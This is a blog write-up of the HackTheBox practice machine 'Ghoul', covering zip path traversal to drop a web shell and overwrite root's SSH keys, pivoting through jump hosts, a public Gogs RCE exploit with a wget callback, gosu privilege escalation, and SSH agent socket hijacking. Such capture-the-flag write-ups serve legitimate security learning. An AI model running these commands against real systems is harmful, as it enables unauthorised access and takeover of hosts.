---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-05-15-ghoul-hackthebox
tags:
- cve
- git
- gogs
- hackthebox
- linux
- ssh agent forwarding
- zip traversal
title: Ghoul @ HackTheBox
---

Ghoul is a nice 40 points machine on hackthebox involving zip traversal, lateral movement, public exploits and some obscure hidden password in a git repository ;)

## User Flag

As usual we start with a tcp port scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a website on port 80 but we can not get too much information out of it. A bit file and directory busting shows a secret.php, where we find a chat protocol:

![](htb_ghoul_chat.png)

The Flag is obviously a trolling attempt but we save the string "ILoveTouka" which turns out to be useful later on. We switch to port 8080 which is asking for basic authentication. After trying some things we eventually try admin:admin,get in and find an upload form:

![](htb_ghoul_upload.png)

We try some uploads but cant really see where it is being put. I remember an exploit I did on 2018-08-18-exploiting-limesurvey where we could create a zip with relative paths in it to get a shell. This technique works here as well. To create the zip we run:

```
zip fuck.zip ../../../../../../../var/www/html/shell.php
```

If you want to do it that way you have to put the shell.php (I used p0wny shell) in your local /var/www/html folder. You can also do `zip fuck.zip shell.php`and edit the paths inside the zip with a hex editor.

After getting a shell (http://10.10.10.101/shell.php) we notice that the file we wrote was created as root. We create another payload, this time overwrite the authorized\_keys file of root, allowing us to ssh into the box as root:

```
ssh-keygen # create xct.key
ssh-keygen -y -f xct.key > xct.pub
cat xct.pub > /root/authorized_keys
sudo zip root.zip ../../../../../../../../root/.ssh/authorized_keys
```

This was probably not the intended way as several clues and notes on the box do not really make sense to me. In "/home/kaneki/" we find the user flag.

## Root Flag

We notice three users on the box Eto, kaneki and noro. All of them have ssh private keys in "/var/backups/backups/keys". The key from kaneki is however protected by a pass phrase. The chat protocol we found earlier suggested that something is on kanekis machine so that is our next target. To get an overview of the network we do a quick scan through the comprised host (we know from ifconfig that the target network is 172.20.0.x):

```
for i in {1..255}; do ping -c1 172.20.0.$i; done 2>/dev/null | grep "time"
64 bytes from 172.20.0.150: icmp_seq=0 ttl=64 time=0.088 ms
```

We notice we can reach a system on 172.20.0.150. We try to ssh into it with kaneki by guessing his passphrase. Eventually we try the string we found in the chat protocol "ILoveTouka" which succeeds in unlocking the key. However we still can not ssh into the box. Grepping through the whole box for "kaneki" we notice that at one point in "/home/kaneki/.ssh/authorized\_keys" the user "kaneki\_pub" is mentioned. Sure enough using that user to ssh into our target works.

Note that we used 10.10.10.101 as a jump host specified by the "-J" Parameter, a neat feature of newer ssh versions. On kaneki-pc we find a to-do.txt in his home folder saying "Give AogiriTest user access to Eto for git.". A quick ifconfig reveals that we are connected to a new subnet so we start to scan for the git box that is mentioned:

```
for i in {1..255}; do ping -c1 172.18.0.$i; done 2>/dev/null | grep "time"
64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.084 ms
64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.135 ms
64 bytes from 172.18.0.200: icmp_seq=0 ttl=64 time=0.036 ms
```

Since .1 is the gateway and .200 our own box the git server has to be at .2. We scan the box to get more information:

```
for p in {1..65535}; do echo hi > /dev/tcp/172.18.0.2/$p && echo port $p is open > scan 2>/dev/null; done 
cat scan
port 3000 is open
```

We setup a dynamic port forwarding through the jump host and use firefox to look at the page:

```
ssh -D9090 -N -i xct.key -J root@10.10.10.101 kaneki_pub@172.20.0.150
```

![](htb_ghoul_gogsweb.png)

The note suggested which user to use but we do not have the password yet. It turns out the credentials for gogs are AogiriTest:test@aogiri123. You can find the password on the host aoigiri in the tomcat configuration.

After logging in we notice that we don’t have much permissions and can’t really proceed. We search for public exploits and find this [one](https://github.com/TheZ3ro/gogsownz). We run the exploit and see that we have indeed RCE:

```
python -m SimpleHTTPServer 8000
proxychains python3 gogsownz.py http://172.18.0.2:3000/ -v -n 'i_like_gogits' -C 'AogiriTest:test@aogiri123' --rce "wget http://172.18.0.200:8000/`whoami`"
172.18.0.2 - - [16/May/2019 16:52:51] "GET /git HTTP/1.1" 404 -
```

We know now that the user is called git – to get a shell we add our public key to gits authorized\_keys file and ssh into gogs:

```
proxychains python3 gogsownz.py http://172.18.0.2:3000/ -v -n 'i_like_gogits' -C 'AogiriTest:test@aogiri123' --rce '
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxq8HpFRiU3k7QGnHx5hrLtU/HrzA7msjPB7g1qtXxO1PyJyhu8P2+3+tDDllLUps8KY2zOVOBfXC6+bZspMYehZobuIuCm1VyJFAfeWvE62/B/RNdee1hRXlvBx0x2o/CiCWy+vqctNFmoT6h/yd3KViBR5uSkUWLOS0Maf+FjGeb7RPiNz0glLdU2027qZviSYZ/AGXKkCJYlgoyHOOexoOeUbbcKfKowiYGyCF5vV1Hqc3fr5cnNQmoa0RosaJVzlO+wp7HcZl33ItgOrAdAWicPQfoGBcdxhYUsnI4Ek957pkDaB73fBBDw9VJbR242q4j6SWLTRE0e3BrRQfR" > /home/git/.ssh/authorized_keys'

ssh -J root@10.10.10.101,kaneki_pub@172.20.0.150 git@172.18.0.2
3713ea5e4353:~$ whoami
git
```

To escalate privileges we look for suid binaries with `find / -perm -u=s -type f 2>/dev/null` and find "/usr/sbin/gosu". This binary allows to become root without effort:

```
3713ea5e4353:~$ gosu root bash
3713ea5e4353:/data/git# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

In the home folder of root we find "session.sh", which contains admin credentials for gogs and aogiri-app.7z, which contains a copy of a git repo. At this point I was stuck forever, like probably most of the other users, since there was nothing of value in that git repo.

As it turns out, we can find the password for root on kaneki-pc inside the repos reflog, a kind of local, temporary undo history of git. By using `git reflog | awk '{ print $1 }' | xargs gitk` we get a grapical view of the git history and can read the password.

![](htb_ghoul_reflog.png)

We use the password ‘7^Grc%C\\7xEQ?tb4’ to su to root on kaneki-pc and look around a bit. Inside /tmp we see some interesting stuff:

```
root@kaneki-pc:/tmp# ls -lah
total 28K
drwxrwxrwt 1 root       root       4.0K May 16 17:06 .
drwxr-xr-x 1 root       root       4.0K May 15 18:19 ..
drwx------ 1 root       root       4.0K Dec 16 07:36 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4.0K Dec 16 07:36 ssh-FWSgs7xBNwzU
drwx------ 1 kaneki_pub kaneki     4.0K Dec 16 07:36 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 May 15 18:19 sshd-stderr---supervisor-1wEv52.log
-rw------- 1 root       root          0 May 15 18:19 sshd-stdout---supervisor-seehSr.log
```

The folders starting with "ssh-" indicate that there is ssh forwarding going on through this host. We check the running processes in a loop and notice the following:

```
root       1351  0.0  0.1  74656  6568 ?        Ss   17:12   0:00 sshd: kaneki_adm [priv]
kaneki_+   1353  0.0  0.0  74656  3352 ?        S    17:12   0:00 sshd: kaneki_adm@pts/2
kaneki_+   1354  0.1  0.1  45188  5544 pts/2    Ss+  17:12   0:00 ssh root@172.18.0.1 -p 2222 -t ./log.sh
```

Every n minutes kaneki\_adm is sshing into 172.18.0.1 on port 2222 through this host. To hijack the forwarding we have to read the content of the "ssh-" folder that is created when the forwarding happens. On the next forwarding we quickly run the hijacking command, entering the hex value and agent id into the command and get the root flag upon successfully connecting:

```
SSH_AUTH_SOCK=/tmp/ssh-QEjvXz6cz2/agent.1162 ssh root@172.18.0.1 -p 2222

Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)
root@Aogiri:~# wc -lc root.txt
 1 33 root.txt
```

Thanks to [egre55](https://twitter.com/egre55) and [MinatoTW](https://twitter.com/minatotw_) for creating this fun box. Besides the obscurely hidden password in the git repository I did enjoy the box.